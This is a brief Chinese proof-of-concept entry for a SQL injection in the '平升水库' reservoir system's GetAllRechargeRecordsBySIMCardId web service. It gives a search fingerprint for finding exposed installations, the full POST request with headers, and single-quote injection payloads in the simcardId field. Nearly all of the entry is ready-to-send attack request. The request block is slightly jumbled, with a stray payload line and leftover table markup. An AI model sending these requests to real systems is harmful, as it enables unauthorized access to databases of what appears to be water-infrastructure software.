# 平升水库GetAllRechargeRecordsBySIMCardId存在SQL注入漏洞

- **系统**：平升水库　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="js/PSExtend.js"`
- **请求**：`POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 33`

**请求体 / payload**
```
loginIdentifer=123&simcardId=-12'
POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
loginIdentifer=123&simcardId=-12'--
:---
```
- **预期**：200　|　—